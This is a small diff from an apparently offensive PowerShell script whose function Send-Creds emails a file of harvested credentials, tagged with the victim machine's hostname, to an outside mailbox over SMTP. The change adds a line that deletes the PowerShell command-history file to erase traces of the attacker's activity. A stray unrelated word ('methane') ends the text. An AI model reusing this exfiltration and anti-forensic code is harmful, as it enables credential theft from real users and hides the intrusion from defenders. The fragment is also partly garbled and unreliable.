@@ -23,6 +23,7 @@ function Send-Creds
     $ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
     $ReportEmail.Attachments.Add("$output")
     $SMTPInfo.Send($ReportEmail)
+    del (Get-PSReadlineOption).HistorySavePath\
 }
 
 methane
